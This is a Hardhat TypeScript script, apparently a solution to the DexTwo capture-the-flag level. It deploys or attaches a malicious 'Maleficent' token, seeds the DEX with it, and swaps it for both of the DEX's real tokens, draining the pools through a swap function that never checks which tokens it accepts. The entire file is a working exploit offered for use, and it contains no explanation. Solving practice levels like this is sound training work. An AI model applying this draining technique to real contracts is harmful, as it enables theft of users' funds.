// @ts-ignore
import { web3, ethers } from "hardhat";

async function main() {
    const Dex2 = await ethers.getContractFactory('DexTwo')
    const dex2 = await Dex2.attach('0x1CDc81C3401E447aFBB6bb7f333fE1f502FfF17D')

    const maleficent = await ethers.getContractFactory('Maleficent')
    // const evil = await maleficent.deploy()
    // console.log("Maleficent Token Address:", evil.address)
    const evil = await maleficent.attach('0xd74953e2C08Dd4D675cb6D67381D6725b627a5b7')

    // Sending 10 MAL to Dex

    let tx1 = await evil.transfer(dex2.address, 10)
    await tx1.wait()
    console.log("Evil tokens in Dex:", await dex2.balanceOf(evil.address, dex2.address).then(v => v.toString()))

    // Swapping out tokenA for our Malicious Token

    let tx2 = await evil.approve(dex2.address, 10000)
    await tx2.wait()
    const token1Add = await dex2.token1()
    const token2Add = await dex2.token2()

    let tx3 = await dex2.swap(evil.address, token1Add, 10)
    await tx3.wait()
    console.log("TokenA in Dex:", await dex2.balanceOf(token1Add, dex2.address).then(v => v.toString()))
    console.log("Evil tokens in Dex:", await dex2.balanceOf(evil.address, dex2.address).then(v => v.toString()))

    let tx4 = await dex2.swap(evil.address, token2Add, 20)
    await tx4.wait()
    console.log("TokenB in Dex:", await dex2.balanceOf(token2Add, dex2.address).then(v => v.toString()))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
